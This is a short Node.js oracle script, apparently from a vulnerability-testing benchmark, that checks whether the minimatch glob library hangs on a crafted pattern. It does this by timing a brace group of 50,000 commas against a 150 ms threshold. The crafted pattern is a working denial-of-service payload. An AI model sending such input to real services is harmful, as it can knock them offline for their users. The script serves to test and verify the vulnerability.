let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  const benignOk = minimatch('index.js', '*.js') === true && minimatch('index.txt', '*.js') === false;
  if (!benignOk) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    finish();
  } else {
    operation_completed = true;

    const commas = 50000;
    const maliciousPattern = '{' + ','.repeat(commas) + '}';

    const t0 = process.hrtime.bigint();
    let malResult;
    try {
      malResult = minimatch('x', maliciousPattern);
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e));
      finish();
      return;
    }
    const ms = Number(process.hrtime.bigint() - t0) / 1e6;

    exploit_succeeded = ms > 150;
    evidence = 'commas=' + commas + ';malicious_ms=' + ms.toFixed(3) + ';result=' + String(malResult);
    finish();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  finish();
}
